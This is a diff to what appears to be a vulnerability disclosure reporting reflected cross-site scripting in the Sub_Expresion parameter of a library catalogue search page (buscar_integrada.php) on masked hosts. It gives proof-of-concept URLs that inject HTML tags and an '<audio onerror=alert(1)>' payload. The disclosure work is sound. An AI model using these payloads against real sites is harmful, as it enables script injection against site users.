@@ -21,4 +21,6 @@ A **XSS vulnerability** was found in the **Sub_Expresion** parameter on buscar_i
 <br>
 www[.]XXXXX[.]com[.]br/buscar_integrada.php?alcance=&IR_A=&campo=Se%EF%BF%BD%EF%BF%BDo&LastKey=fdsfadsa&base=arquivo&Diccio=4-1&**Sub_Expresion**=%22fda%3Cinput%3E%3Cinput%3Esfdafds%22&Sub_Expresiones=&Navegacion=&Expresion=&Campos=TW_+~~~+REF_+~~~+DAL_+~~~+FUL_+~~~+SEC_+~~~+SPL_+~~~+GDL_&Operadores=and+~~~+and+~~~+and+~~~+and+~~~+and+~~~+and&modo=1B&llamado_desde=avanzada.php&lang=pt&resaltar=S&prefijo=SEC_&Opcion=buscar_diccionario&Seleccionados=%22fdsaf%22
 
-![image](https://www.guerrilhacibernetica.com.br/images/next.png?abcd)
+<br>
+
+www[.]XXXXXXX[.]com/opac/php/buscar_integrada.php?lang=pt&base=acervo&modo=1B&alcance=and&Opcion=libre&prefijo=TW_&Sub_Expresion=MG_00056fas%3Caudio%20src/onerror=alert(1)%3E
